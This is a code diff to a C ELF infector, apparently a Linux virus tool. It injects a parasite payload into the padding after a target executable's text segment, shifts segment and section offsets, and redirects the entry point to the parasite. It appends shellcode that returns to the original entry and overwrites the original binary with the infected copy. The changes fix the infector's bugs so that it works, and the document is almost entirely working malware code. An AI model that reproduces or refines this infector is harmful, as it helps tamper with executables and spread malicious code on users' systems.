@@ -33,7 +33,7 @@ char parasite_shellcode[] =
 	"\xb8\x00\x00\x00\x00\xff\xe0";
 
 #ifdef DEBUG 
-void debug_shellcode(const char *msg, const char* shellcode, int shellcode_size);
+void debug_shellcode(const char *msg, const uint8_t* shellcode, int shellcode_size);
 #endif
 
 
@@ -43,7 +43,6 @@ typedef struct elf_data {
 	int fd;
 	struct stat file_stat;
 	uint8_t *mem;
-
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
@@ -85,12 +84,12 @@ error:
 }
 
 #ifdef DEBUG 
-void debug_shellcode(const char* msg, const char* shellcode, int shellcode_size) {
+void debug_shellcode(const char* msg, const uint8_t* shellcode, int shellcode_size) {
 	int shellcode_idx, shellcode_off = 0;
 	char shellcode_str[shellcode_size * 3];
 
 	for(shellcode_idx = 0; shellcode_idx < shellcode_size; shellcode_idx++) {
-		shellcode_off += sprintf(shellcode_str + shellcode_off, "%x ", (uint8_t)shellcode[shellcode_idx]);
+		shellcode_off += sprintf(shellcode_str + shellcode_off, "%x ", shellcode[shellcode_idx]);
 	}
 	shellcode_str[shellcode_size * 3 - 1] = '\0';
 	PRINT_DEBUG("%s: %s\n", msg, shellcode_str);
@@ -205,17 +204,19 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 		if (&target->phdr[phdr_i] == target_text_phdr) {
 
 			end_of_text = target_text_phdr->p_offset + target_text_phdr->p_filesz;
-			PRINT_DEBUG("End of text of target \"%s\": %d\n", target->path, end_of_text);
+			PRINT_DEBUG("End of text of target \"%s\": %x\n", target->path, end_of_text);
 			parasite_vaddr = target_text_phdr->p_vaddr + target_text_phdr->p_filesz;
 			PRINT_DEBUG("Parasite \"%s\" infection virtual address in target \"%s\": %p\n", payload->path, target->path, parasite_vaddr);
-			parasite_len = payload_text_phdr->p_filesz + sizeof(parasite_shellcode);
+			parasite_len = payload_text_phdr->p_filesz + sizeof(parasite_shellcode) - 1;
+			target->ehdr->e_entry = parasite_vaddr;
 
 			target_text_phdr->p_filesz += parasite_len;
 			target_text_phdr->p_memsz += parasite_len;
 
 			for(phdr_j = phdr_i + 1; phdr_j < target->ehdr->e_phnum; phdr_j++) {
 				if(target->phdr[phdr_j].p_offset > target_text_phdr->p_offset + target_text_phdr->p_filesz) {
-					PRINT_DEBUG("Offset of target \"%s\" segment %d was increased by %d bytes\n", target->path, phdr_j, getpagesize());
+					PRINT_DEBUG("Offset of target \"%s\" segment %d was increased from %d to %d bytes\n", 
+							target->path, phdr_j, target->phdr[phdr_j].p_offset, target->phdr[phdr_j].p_offset + getpagesize() );
 					target->phdr[phdr_j].p_offset += getpagesize();
 				}
 			}
@@ -224,8 +225,9 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 	}
 
 	for(shdr_i = 0; shdr_i < target->ehdr->e_shnum; shdr_i++) {
-		if (target->shdr[shdr_i].sh_addr > parasite_vaddr) {
-			PRINT_DEBUG("Ofset of target \"%s\" section %d was increadr by %d bytes\n", target->path, shdr_i, getpagesize());
+		if (target->shdr[shdr_i].sh_offset >= end_of_text) {
+			PRINT_DEBUG("Ofset of target \"%s\" section %d was increased from %d to %d bytes\n", 
+				target->path, shdr_i, target->shdr[shdr_i].sh_offset, target->shdr[shdr_i].sh_offset + getpagesize());
 			target->shdr[shdr_i].sh_offset += getpagesize();
 		} else if (target->shdr[shdr_i].sh_addr + target->shdr[shdr_i].sh_size == parasite_vaddr) {
 			PRINT_INFO("Found section header where payload \"%s\" should locate: %p\n", payload->path, target->shdr[shdr_i].sh_addr);
@@ -233,7 +235,8 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 		}
 	}
 
-	target->ehdr->e_entry = parasite_vaddr;
+	target->ehdr->e_shoff += getpagesize();
+
 	PRINT_INFO("Changed entry point of target \"%s\" to %p\n", target->path, parasite_vaddr);	
 
 	int temp_fd;
@@ -252,7 +255,11 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 	}
 	PRINT_INFO("First part (up to end of text segment) of target \"%s\" wrote to file \"%s\"\n", target->path, TMP);
 
-	if(write(temp_fd, (uintptr_t*)&payload_text_phdr->p_vaddr, payload_text_phdr->p_filesz) != payload_text_phdr->p_filesz) {
+#ifdef DEBUG
+	//debug_shellcode("Payload shellcode\n", &payload->mem[payload_text_phdr->p_offset], payload_text_phdr->p_filesz);
+#endif
+
+	if(write(temp_fd, &payload->mem[payload_text_phdr->p_offset], payload_text_phdr->p_filesz - 1) != payload_text_phdr->p_filesz - 1) {
 		PRINT_ERROR("Error while write payload \"%s\" data into file %s\n", payload->path, TMP);
 		close(temp_fd);
 		return -1;
@@ -276,6 +283,8 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 	}
 	PRINT_INFO("Shellcode for restore original target \"%s\" entrypoint %d wrote to file \"%s\"\n",
 			target->path, old_entry_addr, payload->path);
+
+	lseek(temp_fd, getpagesize() - parasite_len, SEEK_CUR);
 	
 	Elf64_Off last_chunk_size = target->file_stat.st_size - end_of_text;
 	if(write(temp_fd, target->mem + end_of_text, last_chunk_size) != last_chunk_size) {
@@ -285,6 +294,10 @@ int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
 	}
 
 	PRINT_INFO("Last chunk (from end .text section up to end file) of target \"%s\" wrote to file \"%s\"\n", target->path, TMP);
+
+	PRINT_INFO("Overwrite original target \"%s\" file with infected \"%s\"\n", target->path, TMP);
+	rename(TMP, target->path);
+
 	close(temp_fd);
 	return 0;
 }
